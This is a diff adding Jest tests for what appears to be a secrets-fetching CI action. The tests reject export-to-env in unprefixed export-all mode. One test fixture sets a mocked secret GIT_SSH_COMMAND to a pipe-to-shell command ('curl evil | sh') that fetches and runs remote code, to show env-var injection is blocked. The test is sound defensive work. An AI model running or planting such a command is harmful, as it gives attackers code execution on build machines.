@@ -108,6 +108,29 @@ describe('parseSecretInput', () => {
     );
   });
 
+  test('throws when export-to-env is used in export-all mode without output-name', () => {
+    expect(() => parseSecretInput('- path: "prod/app"\n  export-to-env: true')).toThrow(
+      /Secret entry 1: "export-to-env" requires a non-empty "output-name" prefix/,
+    );
+  });
+
+  test('throws when export-to-env is used in export-all mode with empty output-name', () => {
+    expect(() => parseSecretInput('- path: "prod/app"\n  output-name: ""\n  export-to-env: true')).toThrow(
+      /Secret entry 1: "export-to-env" requires a non-empty "output-name" prefix/,
+    );
+  });
+
+  test('throws when export-to-env is used in export-all mode with bare "*" prefix', () => {
+    expect(() => parseSecretInput('- path: "prod/app"\n  output-name: "*"\n  export-to-env: true')).toThrow(
+      /Secret entry 1: "export-to-env" requires a non-empty "output-name" prefix/,
+    );
+  });
+
+  test('accepts export-to-env in export-all mode with a non-empty prefix', () => {
+    const input = '- path: "prod/app"\n  output-name: "APP_*"\n  export-to-env: true';
+    expect(parseSecretInput(input)).toEqual([{ path: 'prod/app', prefix: 'APP_', alias: '', exportToEnv: true }]);
+  });
+
   test('returns empty array for empty YAML list', () => {
     expect(parseSecretInput('[]')).toEqual([]);
   });
@@ -328,6 +351,23 @@ describe('run', () => {
     await run();
 
     expect(mockedSecret.setSecretOutput).toHaveBeenCalledWith('my_app_apiKey', 'sk-123', 'MY_APP_APIKEY');
+  });
+
+  test('does not let secret field names choose env var names in unprefixed export-all mode', async () => {
+    setupInputs({
+      'site-id': SITE_ID,
+      'static-secrets': yamlSecrets('path: "prod/app"\n  export-to-env: true'),
+    });
+    mockedCore.getIDToken.mockResolvedValue('token');
+    mockedClient.fetchSecret.mockResolvedValue({ GIT_SSH_COMMAND: 'sh -c "curl evil | sh"' });
+
+    await run();
+
+    expect(mockedCore.setFailed).toHaveBeenCalledWith(
+      expect.stringContaining('"export-to-env" requires a non-empty "output-name" prefix'),
+    );
+    expect(mockedClient.fetchSecret).not.toHaveBeenCalled();
+    expect(mockedSecret.setSecretOutput).not.toHaveBeenCalled();
   });
 
   test('aliases a JSON key with unsupported characters via output-name', async () => {
